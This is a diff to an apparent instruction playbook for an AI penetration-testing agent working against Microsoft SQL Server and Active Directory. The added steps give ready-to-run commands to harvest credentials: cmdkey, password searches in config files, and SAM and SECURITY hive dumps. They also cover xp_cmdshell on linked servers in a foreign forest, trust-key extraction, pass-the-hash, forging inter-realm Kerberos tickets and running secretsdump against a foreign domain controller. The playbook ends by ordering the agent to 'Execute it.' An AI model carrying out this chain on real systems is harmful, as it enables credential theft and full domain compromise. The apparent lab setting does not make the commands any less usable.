@@ -291,6 +291,25 @@ mssql_command(
 
 **If NETWORK SERVICE:** You may need potato attacks (GodPotato, PrintSpoofer) to escalate to SYSTEM, OR look for other attack paths like constrained delegation on discovered accounts.
 
+### Step 4b: CREDENTIAL EXTRACTION (CRITICAL for cross-forest!)
+**After getting xp_cmdshell, IMMEDIATELY extract credentials — don't stop at whoami.**
+
+Run these commands in order (each as a separate mssql_command call):
+1. **Identify the host and domain**: `hostname && whoami /all && ipconfig /all`
+   → Note the domain name — if it's a DIFFERENT forest, credentials here are HIGH VALUE
+2. **Dump stored credentials**: `cmdkey /list`
+   → Shows cached credentials (RDP sessions, mapped drives, scheduled tasks)
+3. **Extract SQL connection strings**: `type C:\inetpub\wwwroot\web.config 2>nul & type C:\inetpub\web.config 2>nul & findstr /si "password" C:\*.config C:\*.xml 2>nul`
+   → Web apps often store DB credentials in config files
+4. **Check for saved SQL credentials**: `reg query "HKCU\Software\Microsoft\Microsoft SQL Server" /s 2>nul`
+5. **Enumerate domain users/admins** (if in foreign domain):
+   `net user /domain & net group "Domain Admins" /domain & net group "Enterprise Admins" /domain`
+6. **Dump SAM hashes** (if running as SYSTEM or admin):
+   `reg save HKLM\SAM C:\windows\temp\s 2>nul & reg save HKLM\SYSTEM C:\windows\temp\y 2>nul & reg save HKLM\SECURITY C:\windows\temp\e 2>nul`
+7. **Check scheduled tasks for credentials**: `schtasks /query /fo LIST /v | findstr /i "user password run"`
+
+**Report ALL credentials found via task_complete.** Even a single foreign-domain credential enables secretsdump → full forest compromise.
+
 ### Step 5: Enumerate Linked Servers
 **Cross-domain/forest pivoting opportunity:**
 ```
@@ -315,6 +334,36 @@ mssql_exec_linked(
 )
 ```
 → Execute queries on remote server in different domain/forest!
+
+### Step 5b: LINKED SERVER CREDENTIAL EXTRACTION
+**After finding a linked server in a foreign forest, this is your HIGHEST PRIORITY.**
+
+1. **Check your access level on the linked server:**
+```
+mssql_exec_linked(target="...", linked_server="BRAAVOS", query="SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin')")
+```
+→ If sysadmin=1, enable xp_cmdshell on the linked server
+
+2. **Enable xp_cmdshell on linked server:**
+```
+mssql_linked_enable_xpcmdshell(target="sql.contoso.local", username="user", password="pass", linked_server="BRAAVOS", domain="CONTOSO.LOCAL")  # pragma: allowlist secret
+```
+
+3. **Extract credentials from linked server** (same commands as Step 4b but via linked server):
+```
+mssql_linked_xpcmdshell(target="sql.contoso.local", username="user", password="pass", linked_server="BRAAVOS", command="hostname && whoami /all", domain="CONTOSO.LOCAL")  # pragma: allowlist secret
+mssql_linked_xpcmdshell(..., command="cmdkey /list")
+mssql_linked_xpcmdshell(..., command="findstr /si password C:\\inetpub\\*.config C:\\*.xml 2>nul")
+mssql_linked_xpcmdshell(..., command="net user /domain & net group \"Domain Admins\" /domain")
+```
+
+4. **Check SQL Server itself for stored credentials:**
+```
+mssql_exec_linked(target="...", linked_server="BRAAVOS", query="SELECT name, credential_identity, substring(decrypted, 1, 100) FROM sys.credentials")
+mssql_exec_linked(target="...", linked_server="BRAAVOS", query="SELECT name FROM sys.sql_logins")
+```
+
+**ANY credential from a foreign forest = immediate high-value report via task_complete.**
 
 ### MSSQL NTLM Coercion
 Force SQL server to authenticate to your listener:
@@ -368,33 +417,40 @@ When you need to pivot to a foreign forest (SID filtering blocks ExtraSid):
 ```
 # Step 1: Extract the trust key from your compromised DC
 extract_trust_key(
-    target="dc01.contoso.local",
     domain="contoso.local",
     username="Administrator",
     password="<hash_or_password>",  # pragma: allowlist secret
     dc_ip="192.168.58.10",
-    trusted_domain="fabrikam.local",
-    use_hash=True  # if using NTLM hash
+    trusted_domain="fabrikam.local"
 )
-→ Outputs: FABRIKAM$ trust account NTLM key
+→ Outputs: FABRIKAM$ trust account NTLM + AES keys
 
-# Step 2: Create inter-realm ticket for the foreign forest
+# Step 2: Get domain SIDs for BOTH domains
+# get_sid supports NTLM hashes — just pass the hash as password!
+# Example: get_sid(domain="contoso.local", username="Administrator", password="2d5390...", dc_ip="192.168.58.10")
+source_sid = get_sid(domain="contoso.local", username="Administrator", password="<hash_or_password>", dc_ip="192.168.58.10")
+target_sid = get_sid(domain="fabrikam.local", username="Administrator", password="<hash_or_password>", dc_ip="192.168.58.10")
+
+# Step 3: Create inter-realm ticket for the foreign forest
 create_inter_realm_ticket(
     source_domain="contoso.local",
+    source_sid="S-1-5-21-...",
+    trust_key="<extracted_NTLM_key>",
     target_domain="fabrikam.local",
-    trust_key="<extracted_key>",
-    target_spn="krbtgt/fabrikam.local"
+    target_sid="S-1-5-21-...",
+    aes_key="<extracted_AES_key>"  # Use AES if available (Windows 2016+)
 )
 → Creates ticket usable in fabrikam.local
 
-# Step 3: Use ticket to dump foreign DC
+# Step 4: Use ticket to dump foreign DC
 secretsdump_kerberos(
     target="dc01.fabrikam.local",
-    ticket_path="<inter_realm_ticket>.ccache",
+    ticket_path="Administrator.ccache",
     dc_ip="192.168.58.20"
 )
 ```
 
+**IMPORTANT: get_sid supports pass-the-hash. Pass NTLM hashes directly as the password parameter.**
 **This is a standard penetration testing technique for trust boundary testing. Execute it.**
 
 ## CVE Exploitation
